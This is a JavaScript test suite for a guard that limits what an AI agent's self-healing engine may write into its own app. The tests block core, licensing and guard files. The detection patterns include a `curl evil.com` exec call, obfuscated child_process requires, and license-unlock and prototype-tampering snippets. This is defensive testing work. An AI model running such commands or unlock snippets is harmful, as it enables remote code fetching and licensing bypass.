"use strict";

const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const os = require("node:os");
const test = require("node:test");

const root = path.join(__dirname, "..");
const { SelfHealingEngine } = require(path.join(root, "services", "self-healing", "self-healing-engine"));
const { HealingMonitor } = require(path.join(root, "services", "self-healing", "healing-monitor"));
const safeguard = require(path.join(root, "services", "self-healing", "healing-safeguard"));
const mainSource = fs.readFileSync(path.join(root, "main.js"), "utf8");
const toolSource = fs.readFileSync(path.join(root, "tools", "self-heal.js"), "utf8");

function tempRoot() {
  return fs.mkdtempSync(path.join(os.tmpdir(), "self-healing-test-"));
}

function makeEngine() {
  const rootDir = tempRoot();
  const appRoot = path.join(rootDir, "app");
  fs.mkdirSync(path.join(appRoot, "renderer-v2"), { recursive: true });
  fs.mkdirSync(path.join(appRoot, "services"), { recursive: true });
  fs.mkdirSync(path.join(appRoot, "tools"), { recursive: true });
  return new SelfHealingEngine({ appRoot, dataRoot: rootDir });
}

// ---------- 护栏：文件级 ----------

test("guard rejects protected core files", () => {
  const result = safeguard.isWritableTarget("main.js");
  assert.equal(result.ok, false);
  assert.match(result.reason, /受保护文件/);
  const ok = safeguard.isWritableTarget("renderer-v2/app.js");
  assert.equal(ok.ok, true);
});

test("guard treats membership system as absolute forbidden zone", () => {
  for (const file of ["services/license-manager.js", "services/membership-utils.js", "services/permission-manager.js"]) {
    const result = safeguard.isWritableTarget(file);
    assert.equal(result.ok, false, `${file} 应被禁止`);
    assert.match(result.reason, /会员|授权|目录/);
  }
  for (const file of ["renderer-v2/license-center.js", "tools/membership.js"]) {
    const result = safeguard.isWritableTarget(file);
    assert.equal(result.ok, false, `${file} 应被禁止`);
  }
  assert.ok(safeguard.detectUnsafeCode("if (licenseStatus.unlocked = true) grantAll()"));
  assert.ok(safeguard.detectUnsafeCode("Object.assign(status,{unlocked:true})"));
  assert.ok(safeguard.detectUnsafeCode("currentLicenseStatus()"));
  assert.ok(safeguard.detectUnsafeCode("isDevMode = true"));
  assert.ok(safeguard.detectUnsafeCode("LicenseManager.prototype.getStatus = function(){}"));
});

// ---------- 高危漏洞回归：可写范围收窄 ----------

test("services/ main dir is forbidden (would allow startup-loaded injection)", () => {
  for (const file of ["services/hermes-acp-client.js", "services/model-adapter.js", "services/response-router.js"]) {
    const result = safeguard.isWritableTarget(file);
    assert.equal(result.ok, false, `${file} 应被禁止`);
  }
  // services/self-healing 自身也不可改（防自废护栏）
  const self = safeguard.isWritableTarget("services/self-healing/healing-safeguard.js");
  assert.equal(self.ok, false);
});

test("tools/ only allows NEW files, never overwrite loaded tools", () => {
  const engine = makeEngine();
  // 新增 tools 文件允许
  const create = engine.apply({ file: "tools/brand-new-tool.js", code: "module.exports = 1;", reason: "new tool" });
  assert.equal(create.ok, true);
  // 覆盖已存在工具拒绝（防主进程 reload 执行）
  const existing = path.join(engine.appRoot, "tools", "existing.js");
  fs.writeFileSync(existing, "module.exports = 1;", "utf8");
  const overwrite = engine.evaluateProposal({ file: "tools/existing.js", code: "module.exports = 2;", reason: "overwrite" });
  assert.equal(overwrite.ok, false);
  assert.match(overwrite.reason, /只能新增文件/);
});

// ---------- 高危漏洞回归：危险代码拦截 ----------

test("guard blocks require/process/fs-write/eval even with obfuscation", () => {
  // 字符串拼接绕过
  assert.ok(safeguard.detectUnsafeCode("const cp = require('child' + '_process')"));
  assert.ok(safeguard.detectUnsafeCode("require('node:child_process')"));
  // execSync
  assert.ok(safeguard.detectUnsafeCode("cp.execSync('curl evil.com')"));
  // 顶层 throw
  assert.ok(safeguard.detectUnsafeCode("throw new Error('boom')"));
  // fs 写
  assert.ok(safeguard.detectUnsafeCode("fs.writeFileSync('/tmp/x', y)"));
  // process.env
  assert.ok(safeguard.detectUnsafeCode("process.env.HOME"));
  // 原型篡改
  assert.ok(safeguard.detectUnsafeCode("X.prototype.getStatus = function(){}"));
});

test("guard validates syntax and rejects broken code", () => {
  assert.equal(safeguard.validateSyntax("const a = 1; module.exports = a;").ok, true);
  assert.equal(safeguard.validateSyntax("const a = ;").ok, false);
});

// ---------- 引擎行为 ----------

test("engine evaluates proposal: rejects protected file", () => {
  const engine = makeEngine();
  const result = engine.evaluateProposal({ file: "main.js", code: "module.exports = 1;", reason: "test" });
  assert.equal(result.ok, false);
});

test("engine refuses membership files and unlocking code end to end", () => {
  const engine = makeEngine();
  const direct = engine.apply({ file: "services/license-manager.js", code: "module.exports = { unlocked: true };", reason: "试试解锁" });
  assert.equal(direct.ok, false);
  const indirect = engine.apply({ file: "renderer-v2/app.js", code: "const x = memberToolEntitlement; module.exports = { x };", reason: "改前端" });
  assert.equal(indirect.ok, false);
});

test("engine applies a renderer change, backs up, does NOT execute", () => {
  const engine = makeEngine();
  const target = path.join(engine.appRoot, "renderer-v2", "sample.js");
  fs.writeFileSync(target, "window.__v = 1;", "utf8");
  const result = engine.apply({
    file: "renderer-v2/sample.js",
    code: "window.__v = 2;",
    reason: "update renderer"
  });
  assert.equal(result.ok, true);
  assert.equal(result.applied, true);
  assert.ok(result.backupPath);
  assert.ok(fs.existsSync(result.backupPath));
  assert.equal(fs.readFileSync(target, "utf8").trim(), "window.__v = 2;");
  const history = engine.history();
  assert.equal(history.length, 1);
  assert.equal(history[0].file, "renderer-v2/sample.js");
});

test("engine creates a new tools file and does not execute it in main process", () => {
  const engine = makeEngine();
  const result = engine.apply({
    file: "tools/brand-new-tool.js",
    code: "module.exports = 1;",
    reason: "add new tool"
  });
  assert.equal(result.ok, true);
  assert.equal(result.existed, false);
  assert.ok(fs.existsSync(path.join(engine.appRoot, "tools", "brand-new-tool.js")));
});

test("engine rejects broken syntax and does not write", () => {
  const engine = makeEngine();
  const target = path.join(engine.appRoot, "renderer-v2", "ok.js");
  fs.writeFileSync(target, "module.exports = 1;", "utf8");
  const result = engine.apply({
    file: "renderer-v2/ok.js",
    code: "module.exports = ;",
    reason: "break it"
  });
  assert.equal(result.ok, false);
  assert.equal(fs.readFileSync(target, "utf8").trim(), "module.exports = 1;");
});

// ---------- 监控 ----------

test("monitor records and dedupes incidents", () => {
  const rootDir = tempRoot();
  const monitor = new HealingMonitor({ dataRoot: rootDir });
  monitor.record({ kind: "tool", source: "web_search", message: "boom A", context: {} });
  monitor.record({ kind: "tool", source: "web_search", message: "boom A", context: {} });
  monitor.record({ kind: "tool", source: "web_search", message: "boom A", context: {} });
  const r4 = monitor.record({ kind: "tool", source: "web_search", message: "boom A", context: {} });
  assert.equal(r4.suppressed, true);
  assert.equal(monitor.summary().total, 3);
});

test("monitor persists incidents to disk", () => {
  const rootDir = tempRoot();
  const monitor = new HealingMonitor({ dataRoot: rootDir });
  monitor.record({ kind: "tool", source: "x", message: "persisted", context: {} });
  const filePath = path.join(rootDir, "self-healing", "incidents.jsonl");
  assert.ok(fs.existsSync(filePath));
});

// ---------- 接线 ----------

test("main.js wires self-healing engine and monitor", () => {
  assert.match(mainSource, /require\(["'].\/services\/self-healing\/self-healing-engine["']\)/);
  assert.match(mainSource, /require\(["'].\/services\/self-healing\/healing-monitor["']\)/);
  assert.match(mainSource, /function ensureSelfHealing\(\)/);
  assert.match(mainSource, /selfHealing: ensureSelfHealing\(\)/);
  assert.match(mainSource, /ensureSelfHealing\(\)\.monitor\.record/);
});

test("Hermes protocol failures are recorded without automatically replaying the user request", () => {
  assert.match(mainSource, /function recoverableHermesProtocolFailure\(error, signal = null\)/);
  assert.match(mainSource, /missing_public_final_envelope/);
  assert.match(mainSource, /!hasDurableHermesExecutionEvidence\(result\)/);
  assert.match(mainSource, /!\(result\.toolCalls \|\| \[\]\)\.length/);
  assert.match(mainSource, /async function runHermesSessionPromptWithRecovery/);
  const wrapper = mainSource.slice(
    mainSource.indexOf("async function runHermesSessionPromptWithRecovery"),
    mainSource.indexOf("async function sendWithHermes")
  );
  assert.equal((wrapper.match(/runHermesSessionPrompt\(/g) || []).length, 1);
  assert.match(wrapper, /automatic_retry_suppressed/);
  assert.match(wrapper, /error\.automaticRetrySuppressed = true/);
  assert.doesNotMatch(wrapper, /fresh_session_retry|selfHealingRecoveryAttempt/);
  assert.match(mainSource, /kind: "runtime_protocol"/);
});

test("health probes observe Hermes without white-ball timeout or success abort", () => {
  const healthSession = mainSource.slice(
    mainSource.indexOf("async function withHermesHealthSession"),
    mainSource.indexOf("function isHermesUnavailableError")
  );
  assert.match(healthSession, /timeoutMs = 0/);
  assert.match(healthSession, /const controller = new AbortController\(\)/);
  assert.match(healthSession, /healthProbeControllers\.add\(controller\)/);
  assert.match(healthSession, /signal: controller\.signal/);
  assert.match(healthSession, /healthProbeControllers\.delete\(controller\)/);
  assert.match(healthSession, /Number\(timeoutMs\) > 0/);
  const delegationProbe = mainSource.slice(
    mainSource.indexOf("async function runHealthHermesDelegationProbe"),
    mainSource.indexOf("async function runHealthHermesSkillProbe")
  );
  assert.doesNotMatch(delegationProbe, /setTimeout\(/);
  assert.doesNotMatch(delegationProbe, /controller\.abort\(/);
});

test("successful retries reconcile historical failed task cards", () => {
  assert.match(mainSource, /function reconcileRecoveredTaskMessages\(targetSessionId = ""\)/);
  assert.match(mainSource, /failedTask\?\.retry_task_ids/);
  assert.match(mainSource, /status: "recovered"/);
  assert.match(mainSource, /recoveredByTaskId: recoveredTask\.task_id/);
  const startup = mainSource.slice(
    mainSource.indexOf("app.whenReady().then(async () => {"),
    mainSource.indexOf('app.on("activate"')
  );
  assert.match(startup, /setTimeout\(\(\) => \{[\s\S]*?reconcileRecoveredTaskMessages\(\)/);
});

test("parallel write tools carry membership guards", () => {
  // modify_app_file 必须拦会员文件路径
  assert.match(mainSource, /executeModifyAppFile[\s\S]{0,900}?会员\/授权系统为绝对禁区/);
  // write_text_file 必须拦系统数据文件（protectedDataPattern 含 heiqiu-db.json）
  assert.match(mainSource, /heiqiu-db\.json/);
  assert.match(mainSource, /protectedDataPattern\.test\(file\)/);
});

test("self-heal tool is exposed with guarded parameters", () => {
  assert.match(toolSource, /id: "self_heal"/);
  assert.match(toolSource, /permission: \{ level: "app\.write", scope: "appRoot" \}/);
  assert.match(toolSource, /engine\.apply\(\{ file, code, reason, diagnosis \}\)/);
  assert.match(toolSource, /action === "revert"/);
  assert.match(toolSource, /action === "history"/);
  assert.match(toolSource, /renderer-v2\/ 下任意文件/);
  // revert 必须过护栏
  assert.match(toolSource, /revert 也必须过完整护栏/);
});
